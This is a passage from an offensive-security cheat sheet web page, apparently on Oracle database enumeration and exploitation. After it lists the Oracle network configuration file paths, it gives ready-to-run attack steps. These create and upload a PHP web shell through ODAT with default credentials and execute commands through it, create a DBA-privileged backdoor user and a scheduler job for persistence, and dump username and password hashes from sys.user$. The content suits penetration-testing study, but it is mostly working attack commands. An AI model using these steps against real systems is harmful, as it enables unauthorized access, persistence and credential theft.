</span></code></pre></div> <hr> <h2 id=oracle-configuration-files>Oracle Configuration Files<a class=headerlink href=#oracle-configuration-files title="Permanent link">&para;</a></h2> <h3 id=tns-configuration>TNS Configuration<a class=headerlink href=#tns-configuration title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-40-1><a id=__codelineno-40-1 name=__codelineno-40-1 href=#__codelineno-40-1></a><span class=c1># tnsnames.ora - Client-side service names</span>
</span><span id=__span-40-2><a id=__codelineno-40-2 name=__codelineno-40-2 href=#__codelineno-40-2></a><span class=nv>$ORACLE_HOME</span>/network/admin/tnsnames.ora
</span><span id=__span-40-3><a id=__codelineno-40-3 name=__codelineno-40-3 href=#__codelineno-40-3></a>
</span><span id=__span-40-4><a id=__codelineno-40-4 name=__codelineno-40-4 href=#__codelineno-40-4></a><span class=c1># listener.ora - Server-side listener configuration</span>
</span><span id=__span-40-5><a id=__codelineno-40-5 name=__codelineno-40-5 href=#__codelineno-40-5></a><span class=nv>$ORACLE_HOME</span>/network/admin/listener.ora
</span><span id=__span-40-6><a id=__codelineno-40-6 name=__codelineno-40-6 href=#__codelineno-40-6></a>
</span><span id=__span-40-7><a id=__codelineno-40-7 name=__codelineno-40-7 href=#__codelineno-40-7></a><span class=c1># sqlnet.ora - Network configuration</span>
</span><span id=__span-40-8><a id=__codelineno-40-8 name=__codelineno-40-8 href=#__codelineno-40-8></a><span class=nv>$ORACLE_HOME</span>/network/admin/sqlnet.ora
</span></code></pre></div> <h3 id=common-paths>Common Paths<a class=headerlink href=#common-paths title="Permanent link">&para;</a></h3> <div class="language-text highlight"><pre><span></span><code><span id=__span-41-1><a id=__codelineno-41-1 name=__codelineno-41-1 href=#__codelineno-41-1></a>Linux:   $ORACLE_HOME/network/admin/
</span><span id=__span-41-2><a id=__codelineno-41-2 name=__codelineno-41-2 href=#__codelineno-41-2></a>Windows: %ORACLE_HOME%\network\admin\
</span></code></pre></div> <hr> <h2 id=advanced-exploitation>Advanced Exploitation<a class=headerlink href=#advanced-exploitation title="Permanent link">&para;</a></h2> <h3 id=web-shell-deployment>Web Shell Deployment<a class=headerlink href=#web-shell-deployment title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-42-1><a id=__codelineno-42-1 name=__codelineno-42-1 href=#__codelineno-42-1></a><span class=c1># Create PHP web shell</span>
</span><span id=__span-42-2><a id=__codelineno-42-2 name=__codelineno-42-2 href=#__codelineno-42-2></a><span class=nb>echo</span><span class=w> </span><span class=s1>&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class=w> </span>&gt;<span class=w> </span>shell.php
</span><span id=__span-42-3><a id=__codelineno-42-3 name=__codelineno-42-3 href=#__codelineno-42-3></a>
</span><span id=__span-42-4><a id=__codelineno-42-4 name=__codelineno-42-4 href=#__codelineno-42-4></a><span class=c1># Upload to web directory</span>
</span><span id=__span-42-5><a id=__codelineno-42-5 name=__codelineno-42-5 href=#__codelineno-42-5></a>./odat.py<span class=w> </span>utlfile<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott<span class=w> </span>-P<span class=w> </span>tiger<span class=w> </span>--sysdba<span class=w> </span>--putFile<span class=w> </span>/var/www/html<span class=w> </span>shell.php<span class=w> </span>./shell.php
</span><span id=__span-42-6><a id=__codelineno-42-6 name=__codelineno-42-6 href=#__codelineno-42-6></a>
</span><span id=__span-42-7><a id=__codelineno-42-7 name=__codelineno-42-7 href=#__codelineno-42-7></a><span class=c1># Access web shell</span>
</span><span id=__span-42-8><a id=__codelineno-42-8 name=__codelineno-42-8 href=#__codelineno-42-8></a>curl<span class=w> </span>http://target/shell.php?cmd<span class=o>=</span>whoami
</span></code></pre></div> <h3 id=persistence-techniques>Persistence Techniques<a class=headerlink href=#persistence-techniques title="Permanent link">&para;</a></h3> <div class="language-sql highlight"><pre><span></span><code><span id=__span-43-1><a id=__codelineno-43-1 name=__codelineno-43-1 href=#__codelineno-43-1></a><span class=c1>-- Create backdoor user</span>
</span><span id=__span-43-2><a id=__codelineno-43-2 name=__codelineno-43-2 href=#__codelineno-43-2></a><span class=k>CREATE</span><span class=w> </span><span class=k>USER</span><span class=w> </span><span class=n>backdoor</span><span class=w> </span><span class=n>IDENTIFIED</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>password</span><span class=p>;</span>
</span><span id=__span-43-3><a id=__codelineno-43-3 name=__codelineno-43-3 href=#__codelineno-43-3></a><span class=k>GRANT</span><span class=w> </span><span class=k>CONNECT</span><span class=p>,</span><span class=w> </span><span class=n>RESOURCE</span><span class=p>,</span><span class=w> </span><span class=n>DBA</span><span class=w> </span><span class=k>TO</span><span class=w> </span><span class=n>backdoor</span><span class=p>;</span>
</span><span id=__span-43-4><a id=__codelineno-43-4 name=__codelineno-43-4 href=#__codelineno-43-4></a>
</span><span id=__span-43-5><a id=__codelineno-43-5 name=__codelineno-43-5 href=#__codelineno-43-5></a><span class=c1>-- Create job for persistence</span>
</span><span id=__span-43-6><a id=__codelineno-43-6 name=__codelineno-43-6 href=#__codelineno-43-6></a><span class=k>BEGIN</span>
</span><span id=__span-43-7><a id=__codelineno-43-7 name=__codelineno-43-7 href=#__codelineno-43-7></a><span class=w>  </span><span class=n>DBMS_SCHEDULER</span><span class=p>.</span><span class=n>CREATE_JOB</span><span class=p>(</span>
</span><span id=__span-43-8><a id=__codelineno-43-8 name=__codelineno-43-8 href=#__codelineno-43-8></a><span class=w>    </span><span class=n>job_name</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=s1>&#39;BACKDOOR_JOB&#39;</span><span class=p>,</span>
</span><span id=__span-43-9><a id=__codelineno-43-9 name=__codelineno-43-9 href=#__codelineno-43-9></a><span class=w>    </span><span class=n>job_type</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=s1>&#39;PLSQL_BLOCK&#39;</span><span class=p>,</span>
</span><span id=__span-43-10><a id=__codelineno-43-10 name=__codelineno-43-10 href=#__codelineno-43-10></a><span class=w>    </span><span class=n>job_action</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=s1>&#39;BEGIN NULL; END;&#39;</span><span class=p>,</span>
</span><span id=__span-43-11><a id=__codelineno-43-11 name=__codelineno-43-11 href=#__codelineno-43-11></a><span class=w>    </span><span class=n>start_date</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=n>SYSTIMESTAMP</span><span class=p>,</span>
</span><span id=__span-43-12><a id=__codelineno-43-12 name=__codelineno-43-12 href=#__codelineno-43-12></a><span class=w>    </span><span class=n>repeat_interval</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=s1>&#39;FREQ=DAILY&#39;</span><span class=p>,</span>
</span><span id=__span-43-13><a id=__codelineno-43-13 name=__codelineno-43-13 href=#__codelineno-43-13></a><span class=w>    </span><span class=n>enabled</span><span class=w> </span><span class=o>=&gt;</span><span class=w> </span><span class=k>TRUE</span>
</span><span id=__span-43-14><a id=__codelineno-43-14 name=__codelineno-43-14 href=#__codelineno-43-14></a><span class=w>  </span><span class=p>);</span>
</span><span id=__span-43-15><a id=__codelineno-43-15 name=__codelineno-43-15 href=#__codelineno-43-15></a><span class=k>END</span><span class=p>;</span>
</span><span id=__span-43-16><a id=__codelineno-43-16 name=__codelineno-43-16 href=#__codelineno-43-16></a><span class=o>/</span>
</span></code></pre></div> <h3 id=data-exfiltration>Data Exfiltration<a class=headerlink href=#data-exfiltration title="Permanent link">&para;</a></h3> <div class="language-sql highlight"><pre><span></span><code><span id=__span-44-1><a id=__codelineno-44-1 name=__codelineno-44-1 href=#__codelineno-44-1></a><span class=c1>-- Export sensitive data</span>
</span><span id=__span-44-2><a id=__codelineno-44-2 name=__codelineno-44-2 href=#__codelineno-44-2></a><span class=k>SELECT</span><span class=w> </span><span class=n>username</span><span class=o>||</span><span class=s1>&#39;:&#39;</span><span class=o>||</span><span class=n>password</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=k>user</span><span class=err>$</span><span class=p>;</span>
</span><span id=__span-44-3><a id=__codelineno-44-3 name=__codelineno-44-3 href=#__codelineno-44-3></a>
</span><span id=__span-44-4><a id=__codelineno-44-4 name=__codelineno-44-4 href=#__codelineno-44-4></a><span class=c1>-- Large data extraction</span>
</span><span id=__span-44-5><a id=__codelineno-44-5 name=__codelineno-44-5 href=#__codelineno-44-5></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sensitive_table</span><span class=p>)</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>ROWNUM</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>1000</span><span class=p>;</span>
</span></code></pre></div> </article> </div> <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> <button type=button class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg> Back to top </button> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../mysql/ class="md-footer__link md-footer__link--prev" aria-label="Previous: MySQL"> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </div> <div class=md-footer__title> <span class=md-footer__direction> Previous </span> <div class=md-ellipsis> MySQL </div> </div> </a> <a href=../../mail/ class="md-footer__link md-footer__link--next" aria-label="Next: Overview"> <div class=md-footer__title> <span class=md-footer__direction> Next </span> <div class=md-ellipsis> Overview </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2024 - Service Enumeration Cheat Sheets </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> <div class=md-social> <a href=https://github.com/yourusername target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill=currentColor d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </a> <a href=https://twitter.com/yourusername target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill=currentColor d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg> </a> <a href=https://linkedin.com/in/yourusername target=_blank rel=noopener title=linkedin.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path fill=currentColor d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <div class=md-progress data-md-component=progress role=progressbar></div> <script id=__config type=application/json>{"base": "../..", "features": ["announce.dismiss", "content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tabs.link", "content.tooltips", "header.autohide", "navigation.expand", "navigation.footer", "navigation.indexes", "navigation.instant", "navigation.instant.prefetch", "navigation.instant.progress", "navigation.prune", "navigation.sections", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow", "toc.integrate"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script> <script src=../../assets/javascripts/bundle.50899def.min.js></script> </body> </html>